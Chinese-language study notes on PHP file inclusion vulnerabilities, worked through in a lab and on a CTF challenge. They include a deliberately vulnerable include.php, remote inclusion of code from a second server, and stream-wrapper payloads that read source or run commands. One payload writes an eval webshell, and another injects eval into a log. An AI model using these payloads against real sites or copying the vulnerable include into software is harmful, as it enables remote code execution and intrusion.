---
title: "网安笔记 - web漏洞 - 文件包含"
category: "网安笔记"
date: 2026-04-07
published: 2026-04-07
author: "Rin"
---

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628991158390-b5543660-8083-4e31-9a9d-16edbbf6a1f0.png)

```
#文件包含漏洞

原理，检测，类型，利用，修复等

#文件包含各个脚本代码
ASP,PHP,JSP,ASPX等

<!-—#include file="1.asp " -->

<!--#include file="top.aspx"-->

<c:import url="http://lthief.one/1.jsp">

<jsp:include page="head .jsp" / >

<%@ include file="head.jsp" %>

<?php Include ( 'test.php ' ) ?>

```

  

### 无限制包含漏洞文件

```
root@f3d91c74e2ee:/var/www/html# cat include.php
<?php

$filename=$_GET['filename'];
include ( $filename);

//http://127.0.0.1:8080/include.php?filename=index.txt

/*

$filename=$_GET['filename'];
include ( $filename ." .html" );

*/
?>
```

index.txt

```
<?php
	phpinfo();
?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628990771337-60b7f63f-bbed-4844-8663-dde5ca111dc3.png)

  

  

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628990843683-85992693-04c1-4f0f-8b4c-8c058b6d3f39.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628991466436-bd1e83fe-732e-405e-8a30-54ed114e2a07.png)

### 有限制文件包含漏洞

未完成

```
root@f3d91c74e2ee:/var/www/html# cat include.php
<?php

$filename=$_GET['filename'];
include($filename.".html");

?>
```

  

### 远程包含

条件

|   |   |
|---|---|
|**allow_url_include**|On|

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628994796454-4c22e359-c6a4-42d4-98e9-dc8efa790ea3.png)

在远程服务器上创建readme.txt并访问

```
<?php
	phpinfo();
?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628995907491-2b705190-eef2-4ba3-a771-d30e12431147.png)

远程包含漏洞利用`[http://10.1.1.7:49153/include.php?filename=http://10.1.1.6/readme.txt](http://10.1.1.7:49153/include.php?filename=http://10.1.1.6/readme.txt)`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628995973280-9894fd26-e121-4c56-a474-60f35195d6bf.png)

  

### 协议玩法

[https://www.cnblogs.com/endust/p/11804767.html](https://www.cnblogs.com/endust/p/11804767.html)

PHP支持的伪协议

```
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

**php.ini参数设置**  
在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。

allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；

allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；

**各协议的利用条件和方法**

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628997823639-8d22e937-1e94-4abd-9e2a-e459e009be24.png)

  

**php://input**

php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。

**注：当enctype=”multipart/form-data”时，php://input是无效的。**

**file://**

用于访问本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。

用法：

|   |   |
|---|---|
|1<br><br>2<br><br>3<br><br>4|1、file://[文件的绝对路径和文件名]|

http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt

2、[文件的相对路径和文件名]

http://127.0.0.1/include.php?file=./phpinfo.txt

**http://、https://**

URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。

用法：

|   |   |
|---|---|
|1|[http：//网络路径和文件名]|

http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt

**php://**

php:// 用于访问各个输入/输出流（I/O streams），经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。

|   |   |
|---|---|
|协议|作用|
|php://input|可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype="multipart/form-data" 的时候php://input 是无效的。|
|php://output|只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。|
|php://fd|(>=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。|
|php://memory php://temp|(>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。|
|php://filter|(>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。|

**php://filter参数详解**

|   |   |
|---|---|
|resource=<要过滤的数据流>|必须项。它指定了你要筛选过滤的数据流。|
|read=<读链的过滤器>|该参数可选。可以设定一个或多个过滤器名称，以管道符(\|)分隔|
|_write=<写链的筛选列表>_|该参数可选。可以设定一个或多个过滤器名称，以管道符(\|)分隔|
|<; 两个链的过滤器>|任何没有以 _read=_ 或 _write=_ 作前缀的筛选器列表会视情况应用于读或写链。|

**可用的过滤器列表（4类）**

|   |   |
|---|---|
|字符串过滤器|作用|
|string.rot13|等同于str_rot13()，rot13变换|
|string.toupper|等同于strtoupper()，转大写字母|
|string.tolower|等同于strtolower()，转小写字母|
|string.strip_tags|等同于strip_tags()，去除html、PHP语言标签|

|   |   |
|---|---|
|转换过滤器|作用|
|convert.base64-encode & convert.base64-decode|等同于base64_encode()和base64_decode()，base64编码解码|
|convert.quoted-printable-encode & convert.quoted-printable-decode|quoted-printable 字符串与 8-bit 字符串编码解码|

|   |   |
|---|---|
|压缩过滤器|作用|
|zlib.deflate & zlib.inflate|在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。|
|bzip2.compress & bzip2.decompress|同上，在本地文件系统中创建 bz2 兼容文件的方法。|

|   |   |
|---|---|
|加密过滤器|作用|
|mcrypt.*|libmcrypt 对称加密算法|
|mdecrypt.*|libmcrypt 对称解密算法|

**读取文件源码用法**

```
php://filter/read=convert.base64-encode/resource=[文件名]
http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```

**执行php代码用法**

```
php://input + [POST DATA]
http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<?php phpinfo(); ?>
```

```
http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```

**phar://、zip://、bzip2://、zlib://**

用于读取压缩文件，zip:// 、 bzip2:// 、 zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。

**用法示例**

```
1、zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
 
2、compress.bzip2://file.bz2
http://127.0.0.1/include.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpghttp://127.0.0.1/include.php?file=compress.bzip2://./file.jpg
 
3、compress.zlib://file.gz
http://127.0.0.1/include.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpghttp://127.0.0.1/include.php?file=compress.zlib://./file.jpg4、phar://
```

**data://**

数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。

```
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

  

#### filter演示

`[http://10.1.1.7:49153/include.php?filename=php://filter/read=convert.base64-encode/resource=index.html](http://10.1.1.7:49153/include.php?filename=php://filter/read=convert.base64-encode/resource=index.html)`读取10.1.1.7中index.php文件以base64编码输出

```
root@f3d91c74e2ee:/var/www/html# cat index.html
<?php
        phpinfo();
?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628998990996-725b40b5-d58f-4c78-a1a4-3b69465ac7ea.png)

  

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628999067715-84b2edde-b072-4806-bacb-d33928f9229c.png)

#### input演示

由于我的hackbar没法提交post数据所以这个没法演示

#### file演示

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629018248627-cc27fb02-b4d1-49ee-8974-a5772e863c4d.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629018324857-0892b996-9457-46c2-8ac9-fc7b568387e8.png)

file://需要的是完整的路径

#### data演示

```
http://10.1.1.7:49153/include.php?filename=data://text/plain,<?php phpinfo();?>
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629018860778-c7ff7e0d-78c5-4b01-8432-76784943cdf9.png)

`[http://10.1.1.7:49153/include.php?filename=data://text/plain,<?php](http://10.1.1.7:49153/include.php?filename=data://text/plain,<?php) system('pwd')?>`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629018878435-80d9b380-72b0-4818-87ea-1922f360c6f1.png)

``[http://10.1.1.7:49153/include.php?filename=data://text/plain,<?php](http://10.1.1.7:49153/include.php?filename=data://text/plain,<?php) echo `ls`?>``

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629019003101-719d86fb-d855-4d88-8fb2-e634cf93c881.png)

  

### 南邮杯CTF

`[http://4.chinalover.sinaapp.com/web7/index.php](http://4.chinalover.sinaapp.com/web7/index.php)`

```
http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629020764409-b3c04554-46ac-4994-a76a-3ef3f454a48c.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629020810279-8bebf12c-dca3-46c6-9429-efc4c5555e82.png)

### ekucms文件包含

```
http://10.1.1.7:49153/index.php?s=my/show/id/{~eval($_POST[x])}
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629035982261-161c14aa-383e-4cb8-958c-b796417630b3.png)

```
root@f3d91c74e2ee:/var/www/html/temp/Logs# pwd
/var/www/html/temp/Logs
root@f3d91c74e2ee:/var/www/html/temp/Logs# ls
21_08_15.log
root@f3d91c74e2ee:/var/www/html/temp/Logs# cat 21_08_15.log
[ 2021-08-15T21:57:58+08:00 ] ERR: (ThinkException) 模板不存在[./template/default/Home/my_{~eval($_POST[x])}.html]
root@f3d91c74e2ee:/var/www/html/temp/Logs#
```

利用环节未完成版本有问题